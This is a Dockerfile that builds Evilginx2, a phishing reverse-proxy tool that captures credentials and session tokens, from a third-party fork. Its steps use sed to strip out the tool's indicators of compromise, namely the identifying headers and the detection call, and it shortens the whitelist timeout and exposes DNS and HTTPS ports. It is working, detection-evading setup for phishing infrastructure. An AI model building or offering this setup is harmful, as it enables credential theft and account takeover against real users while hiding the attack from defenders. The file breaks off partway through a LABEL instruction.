FROM golang:alpine

ARG BUILD_RFC3339="1970-01-01T00:00:00Z"
ARG COMMIT="local"
ARG VERSION="v3.0.0"

ENV GITHUB_USER="therealelyayo"
ENV EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/cooking"
ENV INSTALL_PACKAGES="git make gcc musl-dev"
ENV PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
ENV EVILGINX_BIN="/bin/evilginx"

RUN mkdir -p ${GOPATH}/src/github.com/${GITHUB_USER} \
    && apk add --no-cache ${INSTALL_PACKAGES} \
    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://github.com/${GITHUB_USER}/cooking 

# Remove IOCs
RUN set -ex \
    && sed -i -e 's/egg2 := req.Host/\/\/egg2 := req.Host/g' \
     -e 's/e_host := req.Host/\/\/e_host := req.Host/g' \
     -e 's/req.Header.Set(string(hg), egg2)/\/\/req.Header.Set(string(hg), egg2)/g' \
     -e 's/req.Header.Set(string(e), e_host)/\/\/req.Header.Set(string(e), e_host)/g' \
     -e 's/p.cantFindMe(req, e_host)/\/\/p.cantFindMe(req, e_host)/g' ${PROJECT_DIR}/core/http_proxy.go
    
# Add "security" & "tech" TLD
RUN set -ex \
    && sed -i 's/arpa/tech\|security\|arpa/g' ${PROJECT_DIR}/core/http_proxy.go

# Add date to EvilGinx2 log
RUN set -ex \
    && sed -i 's/"%02d:%02d:%02d", t.Hour()/"%02d\/%02d\/%04d - %02d:%02d:%02d", t.Day(), int(t.Month()), t.Year(), t.Hour()/g' ${PROJECT_DIR}/log/log.go

# Set "whitelistIP" timeout to 10 seconds
RUN set -ex \
    && sed -i 's/10 \* time.Minute/10 \* time.Second/g' ${PROJECT_DIR}/core/http_proxy.go

WORKDIR ${PROJECT_DIR}
RUN set -x \
    && go get -v && go build -v \
    && cp -v evilginx2 ${EVILGINX_BIN} \
    && mkdir -v /app && cp -vr phishlets /app


    
RUN set -ex \
        && cd ${PROJECT_DIR}/ && go get ./... && make \
		&& cp ${PROJECT_DIR}/build/evilginx ${EVILGINX_BIN} \
		&& apk del ${INSTALL_PACKAGES} && rm -rf /var/cache/apk/* && rm -rf ${GOPATH}/src/*
RUN set -ex \
        && cd ${PROJECT_DIR}
COPY ./docker-entrypoint.sh /opt/
RUN chmod +x /opt/docker-entrypoint.sh
		
ENTRYPOINT ["/opt/docker-entrypoint.sh"]
EXPOSE 53 443

STOPSIGNAL SIGKILL

# Build-time metadata as defined at http://label-schema.org
ARG BUILD_DATE
ARG VCS_REF
ARG VERSION

LABEL org.label-schema.build-date=$BUILD_DATE \

